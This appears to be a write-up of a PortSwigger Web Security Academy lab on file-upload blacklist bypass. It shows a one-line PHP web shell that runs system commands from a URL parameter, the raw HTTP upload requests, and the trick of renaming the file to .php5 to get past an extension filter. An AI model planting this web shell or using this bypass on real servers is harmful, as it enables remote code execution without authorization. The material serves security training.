## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/ebebf5e5-90e1-448c-9065-38df9a33c893)

## Overview :

One of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like .php. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as **.php5,.shtml,.oho4,.php7,.phtml** and so on. 

## Solution :

Login as wiener to access the upload functionality.

Upload a **.php** file with the following payload `<?php echo system($_GET['command']); ?>`.`

THe request sent is as follows,

```html
POST /my-account/avatar HTTP/2
Host: 0ac60088039dd25f82402e9300fb007e.web-security-academy.net
Cookie: session=GnGAzOUPjzGgNytcTKzcIplgL1T4H38L
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------35474142021105913272615045188
Content-Length: 524
Origin: https://0ac60088039dd25f82402e9300fb007e.web-security-academy.net
Referer: https://0ac60088039dd25f82402e9300fb007e.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------35474142021105913272615045188
Content-Disposition: form-data; name="avatar"; filename="file.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>

-----------------------------35474142021105913272615045188
Content-Disposition: form-data; name="user"

wiener
-----------------------------35474142021105913272615045188
Content-Disposition: form-data; name="csrf"

jLshXykyOmSzsk0t4U8ptEGdgN6k5NUE
-----------------------------35474142021105913272615045188--
```


We get an error response stating that **.php files are not allowed to be uploaded.**

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/d92c9ee8-25ee-4fd9-9930-f7254289b044)

This is maybe because in the body of the request we have a `filename="file.php" parameter`. From this we may assume that the server identifies it as a **.php file extension**  and rejects the upload request.

### Byassing the extension bypass -

In the same request we can give other types of php like **php5/php4** etc..,

Modify the **filename=** parameter with the filename extension as **.php5**.

```
POST /my-account/avatar HTTP/2
Host: 0ac60088039dd25f82402e9300fb007e.web-security-academy.net
.
.
.
-----------------------------35474142021105913272615045188
Content-Disposition: form-data; name="avatar"; filename="file.php5"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>

-----------------------------35474142021105913272615045188
Content-Disposition: form-data; name="user"

wiener
-----------------------------35474142021105913272615045188
Content-Disposition: form-data; name="csrf"

jLshXykyOmSzsk0t4U8ptEGdgN6k5NUE
-----------------------------35474142021105913272615045188--
```
This time we get _file successfully uploaded_ message in the response response.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/90e0c5b1-161c-4cd5-8805-47a98a6cff26)


